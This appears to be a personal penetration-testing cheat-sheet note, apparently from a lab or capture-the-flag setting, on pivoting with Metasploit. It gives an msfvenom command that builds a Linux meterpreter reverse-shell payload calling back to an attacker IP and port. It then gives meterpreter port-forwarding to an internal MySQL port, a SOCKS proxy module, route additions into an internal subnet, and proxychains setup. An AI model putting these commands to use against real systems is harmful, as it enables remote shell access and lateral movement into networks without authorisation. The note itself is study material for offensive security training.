- Create a payload with msfvenom
`msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.11 LPORT=8002 -f elf -o msf.bin`
- Upload the payload on target machine and get a meterpreter shell

## Portfwd

`portfwd add -l 8003 -p 3306 -r 172.17.0.2`

## Socks Proxy

- `use server/socks_proxy`
- start the proxy server 
- addroute to the remote host 
`route add 172.17.0.0/24 2`
![[Pasted image 20210429114040.png]]
- Edit the /etc/proxychains.conf file to use a socks5 proxy on the specified port
![[Pasted image 20210429114322.png]]
- 